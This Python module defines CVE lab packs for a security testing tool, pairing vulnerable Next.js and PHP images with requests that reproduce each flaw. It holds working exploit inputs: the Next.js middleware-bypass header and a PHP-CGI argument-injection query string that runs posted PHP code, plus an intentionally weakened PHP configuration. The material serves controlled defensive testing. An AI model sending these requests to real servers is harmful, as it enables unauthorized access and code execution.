"""Reviewed managed-lab packs, versions and immutable image references.

Each entry in PACKS couples a reviewed vulnerable application with the
request that reproduces the vulnerability and the observations the evidence
classifier expects. Packs are data: landing a new pack means adding a reviewed
entry here plus the matching baseline gate and classifier, not new runner code.

Every ``application_image`` and ``runner_image`` must be pinned by digest;
``prepare`` refuses references without ``@sha256:``. A pack whose lab image
has not completed its build-and-review carries an explicit unreviewed tag and
``image_status`` so ``mockforge cve list`` states that plainly instead of
silently pulling an unpinned image.
"""

# Reviewed lab application and configuration for the PHP2Shell 2026 packs,
# shipped inside the pack and mounted read-only into the pinned official
# image. The advisory's corruption happens before application code runs;
# these files give healthy requests a deterministic answer and make the
# worker identity observable. lab.ini deliberately sets memory_limit BELOW
# post_max_size: the advisory's OOM-during-input-parse trigger class is then
# reachable with the pack's bounded request bodies, whereas on the default
# ordering post_max_size would reject the body before memory pressure is
# reachable. This is a reviewed lab configuration, not a production
# recommendation.
PHP2SHELL_2026_FILES = {
    "index.php": (
        "<?php\n"
        "// MockForge PHP2Shell 2026 managed lab application (reviewed).\n"
        "header('X-Worker-Pid: ' . getmypid());\n"
        "echo \"mockforge-php2shell-2026\\n\";\n"
    ),
    "health.php": (
        "<?php\n"
        "// MockForge PHP2Shell 2026 managed lab application (reviewed).\n"
        "header('X-Worker-Pid: ' . getmypid());\n"
        "echo \"mockforge-php2shell-2026\\n\";\n"
    ),
    "upload.php": (
        "<?php\n"
        "// MockForge PHP2Shell 2026 managed lab application (reviewed).\n"
        "// Multipart parsing already happened before this runs; a corrupted\n"
        "// parse never reaches this file.\n"
        "header('X-Worker-Pid: ' . getmypid());\n"
        "echo \"upload processed\\n\";\n"
    ),
    "lab.ini": (
        "; Reviewed lab configuration for the PHP2Shell 2026 packs.\n"
        "memory_limit=16M\n"
        "post_max_size=48M\n"
        "upload_max_filesize=48M\n"
        "max_file_uploads=64\n"
        "log_errors=On\n"
    ),
    ".htaccess": (
        "# Reviewed lab configuration: exercises the pre-startup php_value\n"
        "# directive path the advisory names as a mod_php consumer route.\n"
        "php_value memory_limit 16M\n"
    ),
}

LABEL = "io.mockforge.cve.run"

PACKS = {
    "CVE-2025-29927": {
        "catalog": {
            "schema_version": 1,
            "pack_revision": 1,
            "cve": "CVE-2025-29927",
            "title": "Next.js middleware authorization bypass",
            "platform": "Linux, local Docker/Podman engine, amd64",
            "application_version": "Next.js 15.2.2 (Vulhub)",
            "application_image": "docker.io/vulhub/nextjs@sha256:f01608b225bcb7952f5e558c445b9bd76a3bfb385e11521d1a06ad4cbe08b4a8",
            "runner_version": "Nuclei 3.11.1",
            "runner_image": "docker.io/projectdiscovery/nuclei@sha256:582d5546902e67052097cb2d07296c642d50a1afc5e44623cb038845df9a32eb",
            "references": [
                "https://github.com/vulhub/vulhub/tree/master/next.js/CVE-2025-29927",
                "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            ],
            "coverage": "One reviewed authorization-bypass case and benign controls; not all variants",
            "origin_port": 18082,
            "listen_address_guidance": (
                "The recorder defaults to 127.0.0.1:18082, which only accepts local "
                "connections. Testing an LB/WAAP on another machine requires "
                "--listen-address <an isolated lab interface IP>; keep that interface "
                "restricted to the test network because the recorder forwards to the "
                "vulnerable application."
            ),
        },
        "probe": {
            "template_id": "mockforge-nextjs-29927-observation",
            "template_name": "MockForge Next.js controlled lab observation",
            "method": "GET",
            "path": "/?__mockforge_cve={token}",
            "headers": {
                "X-Mockforge-Cve": "{token}",
                "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware",
            },
            "body": None,
            "signature_header": "x-middleware-subrequest",
            # Body marker proving the bypass reached the application.
            "marker": "Dashboard Content",
        },
        "app": {
            "port": "3000/tcp",
            "env": {"NODE_ENV": "production"},
            "readiness": {"path": "/login", "status": 200},
        },
        "controls": {
            "benign_path": "/login?__mockforge_cve={token}",
            "benign_status": 200,
            "ordinary_path": "/?__mockforge_cve={token}",
            "ordinary_status": 307,
        },
        "baseline_gate": "middleware-bypass",
        "classifier": "middleware-bypass",
    },
    "CVE-2024-4577": {
        "catalog": {
            "schema_version": 1,
            "pack_revision": 1,
            "cve": "CVE-2024-4577",
            "title": "PHP CGI argument injection via Windows best-fit codepage",
            "platform": "Linux amd64 host, local Docker/Podman engine, Wine-based Windows PHP lab image",
            "application_version": "PHP 8.3.7 cgi (Windows, vulnerable) under Wine; Apache httpd 2.4.70 CGI harness",
            # NOT a reviewed image yet: the tag is an explicit placeholder and
            # prepare/run refuse it until the digest below is replaced with the
            # reviewed lab-host build (see examples/cve-lab/cve-2024-4577-lab-image/).
            "application_image": "docker.io/mockforge/cve-lab-phpcgi-wine:pending-lab-host-review",
            "image_status": "pending-lab-host-review",
            "runner_version": "Nuclei 3.11.1",
            "runner_image": "docker.io/projectdiscovery/nuclei@sha256:582d5546902e67052097cb2d07296c642d50a1afc5e44623cb038845df9a32eb",
            "references": [
                "https://github.com/advisories/GHSA-vxpp-6299-mxw3",
                "https://www.php.net/releases/8.3/release-8.3.8.php",
            ],
            "coverage": "One reviewed CGI argument-injection case and benign controls; not all codepages or handlers",
            "origin_port": 18082,
            "listen_address_guidance": (
                "The recorder defaults to 127.0.0.1:18082, which only accepts local "
                "connections. Testing an LB/WAAP on another machine requires "
                "--listen-address <an isolated lab interface IP>; keep that interface "
                "restricted to the test network because the recorder forwards to the "
                "vulnerable application."
            ),
        },
        "probe": {
            "template_id": "mockforge-phpcgi-4577-observation",
            "template_name": "MockForge PHP-CGI controlled lab observation",
            "method": "POST",
            # The exploit query must stay the entire query string: php-cgi's
            # argv-style parsing splits on '+', so any additional query
            # parameter would glue onto or hide the injected switches. The run
            # token rides the X-Mockforge-Cve header only.
            "path": "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput",
            "headers": {
                "X-Mockforge-Cve": "{token}",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "body": "<?php echo 'MOCKFORGE-CVE-2024-4577'; ?>",
            "signature_header": None,
            # Body marker proving the injected PHP executed on the origin.
            "marker": "MOCKFORGE-CVE-2024-4577",
        },
        "app": {
            "port": "8080/tcp",
            "env": {},
            # Benign direct CGI access (no injected switches) is rejected by
            # the harness configuration; the reviewed image pins this status.
            "readiness": {"path": "/php-cgi/php-cgi.exe", "status": 404},
        },
        "controls": {
            "benign_path": "/php-cgi/php-cgi.exe?__mockforge_cve={token}",
            "benign_status": 404,
            "ordinary_path": "/?__mockforge_cve={token}",
            "ordinary_status": 200,
        },
        "baseline_gate": "cgi-argument-injection",
        "classifier": "cgi-argument-injection",
    },
    "CVE-2026-109618": {
        "catalog": {
            "schema_version": 1,
            "pack_revision": 1,
            "cve": "CVE-2026-109618",
            "title": "PHP2Shell 2026: PHP core OOM request-lifecycle corruption (mod_php)",
            "platform": "Linux, local Docker/Podman engine, amd64",
            "application_version": "PHP 8.4.26 (official image), Apache with mod_php, reviewed lab configuration",
            "application_image": "docker.io/library/php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a",
            "runner_version": "Nuclei 3.11.1",
            "runner_image": "docker.io/projectdiscovery/nuclei@sha256:582d5546902e67052097cb2d07296c642d50a1afc5e44623cb038845df9a32eb",
            "references": [
                "https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w",
                "https://www.php.net/releases/8.4/release-8.4.27.php",
            ],
            "coverage": "One reviewed OOM-during-input-parse corruption case on mod_php and benign controls; not remote code execution, not FPM, not every trigger variant",
            "origin_port": 18082,
            "listen_address_guidance": (
                "The recorder defaults to 127.0.0.1:18082, which only accepts local "
                "connections. Testing an LB/WAAP on another machine requires "
                "--listen-address <an isolated lab interface IP>; keep that interface "
                "restricted to the test network because the recorder forwards to the "
                "vulnerable application."
            ),
            "verification_status": "pending-lab-host-verification",
        },
        "probe": {
            "template_id": "mockforge-php2026-618-observation",
            "template_name": "MockForge PHP2Shell 2026 controlled lab observation",
            "method": "GET",
            "path": "/health.php?__mockforge_cve={token}",
            "headers": {
                "X-Mockforge-Cve": "{token}",
            },
            "body": None,
            "signature_header": None,
            # Body marker proving the application was healthy and observable.
            "marker": "mockforge-php2shell-2026",
        },
        "app": {
            "port": "80/tcp",
            "env": {},
            "readiness": {"path": "/health.php", "status": 200},
            "workdir": "/var/www/html",
            "mounts": [
                {"host": "{output}/index.php", "container": "/var/www/html/index.php"},
                {"host": "{output}/health.php", "container": "/var/www/html/health.php"},
                {"host": "{output}/upload.php", "container": "/var/www/html/upload.php"},
                {"host": "{output}/lab.ini", "container": "/usr/local/etc/php/conf.d/zz-mockforge-lab.ini"},
                {"host": "{output}/.htaccess", "container": "/var/www/html/.htaccess"},
            ],
        },
        "application_files": PHP2SHELL_2026_FILES,
        "controls": {
            "benign_path": "/health.php?__mockforge_cve={token}",
            "benign_status": 200,
            "ordinary_path": "/?__mockforge_cve={token}",
            "ordinary_status": 200,
        },
        "exploit": {
            "method": "POST",
            "path": "/upload.php?__mockforge_cve={token}",
            "headers": {
                "X-Mockforge-Cve": "{token}",
            },
            "max_forwarded_body": 48 * 1024 * 1024,
            "timeout": 60,
        },
        "baseline_gate": "modphp-segfault",
        "classifier": "modphp-segfault",
        "baseline_exploit": "modphp-oom",
        "target_exploit": "modphp-oom",
    },
    "CVE-2026-109619": {
        "catalog": {
            "schema_version": 1,
            "pack_revision": 1,
            "cve": "CVE-2026-109619",
            "title": "PHP2Shell 2026: PHP core same-worker use-after-free (mod_php)",
            "platform": "Linux, local Docker/Podman engine, amd64",
            "application_version": "PHP 8.4.26 (official image), Apache with mod_php, reviewed lab configuration",
            "application_image": "docker.io/library/php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a",
            "runner_version": "Nuclei 3.11.1",
            "runner_image": "docker.io/projectdiscovery/nuclei@sha256:582d5546902e67052097cb2d07296c642d50a1afc5e44623cb038845df9a32eb",
            "references": [
                "https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp",
                "https://www.php.net/releases/8.4/release-8.4.27.php",
            ],
            "coverage": "One reviewed producer-then-consumer same-worker case on mod_php and benign controls; not remote code execution, not FPM, not every consumer path",
            "origin_port": 18082,
            "listen_address_guidance": (
                "The recorder defaults to 127.0.0.1:18082, which only accepts local "
                "connections. Testing an LB/WAAP on another machine requires "
                "--listen-address <an isolated lab interface IP>; keep that interface "
                "restricted to the test network because the recorder forwards to the "
                "vulnerable application."
            ),
            "verification_status": "pending-lab-host-verification",
        },
        "probe": {
            "template_id": "mockforge-php2026-619-observation",
            "template_name": "MockForge PHP2Shell 2026 controlled lab observation",
            "method": "GET",
            "path": "/health.php?__mockforge_cve={token}",
            "headers": {
                "X-Mockforge-Cve": "{token}",
            },
            "body": None,
            "signature_header": None,
            # Body marker proving the application was healthy and observable.
            "marker": "mockforge-php2shell-2026",
        },
        "app": {
            "port": "80/tcp",
            "env": {},
            "readiness": {"path": "/health.php", "status": 200},
            "workdir": "/var/www/html",
            "mounts": [
                {"host": "{output}/index.php", "container": "/var/www/html/index.php"},
                {"host": "{output}/health.php", "container": "/var/www/html/health.php"},
                {"host": "{output}/upload.php", "container": "/var/www/html/upload.php"},
                {"host": "{output}/lab.ini", "container": "/usr/local/etc/php/conf.d/zz-mockforge-lab.ini"},
                {"host": "{output}/.htaccess", "container": "/var/www/html/.htaccess"},
            ],
        },
        "application_files": PHP2SHELL_2026_FILES,
        "controls": {
            "benign_path": "/health.php?__mockforge_cve={token}",
            "benign_status": 200,
            "ordinary_path": "/?__mockforge_cve={token}",
            "ordinary_status": 200,
        },
        "exploit": {
            "method": "POST",
            "path": "/upload.php?__mockforge_cve={token}",
            "headers": {
                "X-Mockforge-Cve": "{token}",
            },
            "max_forwarded_body": 48 * 1024 * 1024,
            "timeout": 60,
        },
        "baseline_gate": "modphp-segfault",
        "classifier": "modphp-segfault",
        "baseline_exploit": "modphp-worker-sequence",
        "target_exploit": "modphp-worker-sequence",
    },
}

# Legacy single-pack exports; existing callers and tests import these names.
CVE = "CVE-2025-29927"
CATALOG = PACKS[CVE]["catalog"]
SIGNATURE = PACKS[CVE]["probe"]["headers"]["x-middleware-subrequest"]
